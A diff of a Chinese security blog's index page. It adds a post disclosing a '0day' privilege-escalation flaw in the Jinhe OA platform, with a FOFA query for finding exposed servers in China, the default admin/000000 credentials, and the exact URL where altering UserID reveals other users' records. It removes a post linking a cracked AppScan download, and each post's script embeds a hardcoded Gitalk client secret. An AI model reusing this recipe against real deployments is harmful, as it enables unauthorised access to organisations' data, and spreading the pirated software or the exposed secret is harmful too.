@@ -66,6 +66,80 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-金和协同水平越权漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/04/04/%E9%87%91%E5%92%8C%E5%8D%8F%E5%90%8C%E6%B0%B4%E5%B9%B3%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2021-04-04T03:43:29.000Z" itemprop="datePublished">2021-04-04</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/04/04/%E9%87%91%E5%92%8C%E5%8D%8F%E5%90%8C%E6%B0%B4%E5%B9%B3%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/">金和协同水平越权漏洞</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>0day 3.28 金和协同管理OA平台. 水平越权漏洞<br>此洞是由 goddmeon 师傅挖掘并授权发表。</p>
+<p>在此感谢 goddmeon 师傅。</p>
+<p>FoFA语法：</p>
+<p>body=”金和协同管理平台” &amp;&amp; country=”CN”</p>
+<p>默认口令</p>
+<p>admin / 000000</p>
+<p>后台登录水平越权</p>
+<p>C6/JHSoft.Web.Dossier/DossierBaseInfoView.aspx?CollID=1&amp;UserID=想要的id用户</p>
+<p>这个id指的是用户编号</p>
+<p>登录，用过用户管理，看到用户编号0001为董事长</p>
+<p>这是admin管理员权限登录的界面</p>
+<p><img src="http://www.0dayhack.net/wp-content/uploads/%E5%9B%BE%E7%89%87-2-1536x639.png" alt="enter image description here"><br>为了验证水平越权漏洞，我们登录一个普通用户账号，下面是普通用户登录后的界面。</p>
+<p><img src="http://www.0dayhack.net/wp-content/uploads/2021/04/%E5%9B%BE%E7%89%87-1536x781.png" alt="enter image description here"></p>
+<p>访问url:</p>
+<p><a target="_blank" rel="noopener" href="http://www.xxxxxxx.net/C6/JHSoft.Web.Dossier/DossierBaseInfoView.aspx?CollID=1&amp;UserID=0001">http://www.xxxxxxx.net/C6/JHSoft.Web.Dossier/DossierBaseInfoView.aspx?CollID=1&amp;UserID=0001</a></p>
+<p><img src="http://www.0dayhack.net/wp-content/uploads/%E5%9B%BE%E7%89%87-3-1536x780.png" alt="enter image description here"></p>
+<div id="gitalk-container"></div>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script src="https://priesttomb.github.io/js/md5.min.js"></script>
+<script >
+var gitalk = new Gitalk({
+  clientID: 'a5bfaa7fddf1c19628f6',
+  clientSecret: '6a1973c92b65bf565b673300ed94c1d07b827727',
+  repo: 'renzhonglin.github.io',
+  owner: 'renzhonglin',
+  admin: 'renzhonglin',
+  id: md5(location.pathname),      // Ensure uniqueness and length less than 50
+  distractionFreeMode: false  // Facebook-like distraction free mode
+})
+gitalk.render('gitalk-container')
+</script>
+
+
+
+
+
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://bo.vuvhz.top/2021/04/04/%E9%87%91%E5%92%8C%E5%8D%8F%E5%90%8C%E6%B0%B4%E5%B9%B3%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/" data-id="ckn2mg0wl0000fjcpcf0n6qud" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-智慧教育越权" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2021/04/04/%E6%99%BA%E6%85%A7%E6%95%99%E8%82%B2%E8%B6%8A%E6%9D%83/" class="article-date">
@@ -760,62 +834,6 @@ gitalk.render('gitalk-container')
 
 
   
-    <article id="post-Appscan-10-0-4破解版" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/03/07/Appscan-10-0-4%E7%A0%B4%E8%A7%A3%E7%89%88/" class="article-date">
-  <time datetime="2021-03-07T13:47:41.000Z" itemprop="datePublished">2021-03-07</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/03/07/Appscan-10-0-4%E7%A0%B4%E8%A7%A3%E7%89%88/">Appscan_10.0.4破解版</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>#AppScan_10.0.4破解版<br><img src="https://secquan.zzyuncheng.com/218a1034bd504945b8b17c1abe4dd68e.png-quanzi" alt="enter image description here"></p>
-<p><img src="https://secquan.zzyuncheng.com/ea06c78478c8ba634ecc19ceb3b813fd.png-quanzi" alt="enter image description here"></p>
-<p><img src="https://secquan.zzyuncheng.com/d94ba970056c21ce3472870dc90c2b5f.png-quanzi" alt="enter image description here"></p>
-<p>链接：链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1RarULLWDgijG3E1_KKMUBw">https://pan.baidu.com/s/1RarULLWDgijG3E1_KKMUBw</a><br>提取码：53g8</p>
-<div id="gitalk-container"></div>
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
-<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
-<script src="https://priesttomb.github.io/js/md5.min.js"></script>
-<script >
-var gitalk = new Gitalk({
-  clientID: 'a5bfaa7fddf1c19628f6',
-  clientSecret: '6a1973c92b65bf565b673300ed94c1d07b827727',
-  repo: 'renzhonglin.github.io',
-  owner: 'renzhonglin',
-  admin: 'renzhonglin',
-  id: md5(location.pathname),      // Ensure uniqueness and length less than 50
-  distractionFreeMode: false  // Facebook-like distraction free mode
-})
-gitalk.render('gitalk-container')
-</script>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://bo.vuvhz.top/2021/03/07/Appscan-10-0-4%E7%A0%B4%E8%A7%A3%E7%89%88/" data-id="ckmogaiik0000aacp484u40t0" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
 
 
   <nav id="page-nav">
@@ -852,6 +870,10 @@ gitalk.render('gitalk-container')
       <ul>
         
           <li>
+            <a href="/2021/04/04/%E9%87%91%E5%92%8C%E5%8D%8F%E5%90%8C%E6%B0%B4%E5%B9%B3%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/">金和协同水平越权漏洞</a>
+          </li>
+        
+          <li>
             <a href="/2021/04/04/%E6%99%BA%E6%85%A7%E6%95%99%E8%82%B2%E8%B6%8A%E6%9D%83/">智慧教育越权</a>
           </li>
         
@@ -865,10 +887,6 @@ gitalk.render('gitalk-container')
         
           <li>
             <a href="/2021/03/23/MessageSolution/">MessageSolution邮件bug</a>
-          </li>
-        
-          <li>
-            <a href="/2021/03/09/phpstudy%E5%90%8E%E9%97%A8/">phpstudy后门</a>
           </li>
         
       </ul>
